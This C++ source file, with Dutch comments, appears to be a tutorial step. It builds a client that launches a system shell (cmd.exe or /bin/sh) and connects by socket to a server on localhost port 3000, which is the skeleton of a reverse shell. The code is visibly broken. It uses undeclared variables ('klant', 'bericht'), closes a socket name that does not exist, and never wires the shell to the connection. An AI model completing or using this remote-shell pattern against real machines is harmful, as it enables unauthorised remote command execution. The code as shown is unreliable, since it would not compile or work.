#include <iostream>
#include <string>
#include <thread>    // std::thread, om twee dingen tegelijk te doen
#include <atomic>    // std::atomic, een vlaggetje dat je veilig vanuit twee
                     // threads tegelijk mag lezen en schrijven
#include "pijpen.h"
#include "net.h"

// Zelfde truc als in server.cpp: de juiste headers per besturingssysteem.
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    // Alleen MSVC kent deze regel; bij MinGW gebruik je -lws2_32.
    #ifdef _MSC_VER
        #pragma comment(lib, "ws2_32.lib")
    #endif
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    typedef int SOCKET;
    const int INVALID_SOCKET = -1;
    const int SOCKET_ERROR   = -1;
    #define closesocket close
#endif

// Welke shell starten we? Op Windows cmd.exe, op Linux /bin/sh.
#ifdef _WIN32
const std::string SHELL = "cmd.exe";
#else
const std::string SHELL = "/bin/sh";
#endif

int main() {
#ifdef _WIN32
    // Winsock opstarten (alleen Windows), zie uitleg in server.cpp.
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup mislukt\n";
        return 1;
    }
#endif

    KindProces shell;
    if (!shell.start(SHELL, "")) {   // leeg argument = shell zonder argument
        std::cerr << "Kon " << SHELL << " niet starten.\n";
        return 1;
    }
  
    std::atomic<bool> loopt{true};
  
    // 1. Maak een socket en verbind met de server op 127.0.0.1:3000.
    SOCKET verbinding = socket(AF_INET, SOCK_STREAM, 0);
    if (verbinding == INVALID_SOCKET) { std::cerr << "socket() mislukt.\n"; return 1; }

    sockaddr_in adres{};
    adres.sin_family = AF_INET;
    adres.sin_port   = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &adres.sin_addr);

    if (connect(verbinding, reinterpret_cast<sockaddr*>(&adres), sizeof(adres)) == SOCKET_ERROR) {
        std::cerr << "Kon niet verbinden (draait de server?).\n";
        return 1;
    }
  
    std::cout << "Verbonden met de server!\n";

    while (recvPlat(klant, bericht)) {
      
        if (bericht == "exit") {
            std::cout << "Client wil stoppen.\n";
            break;
        }      

    }

    // Stap 6: opruimen.
    closesocket(sock);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
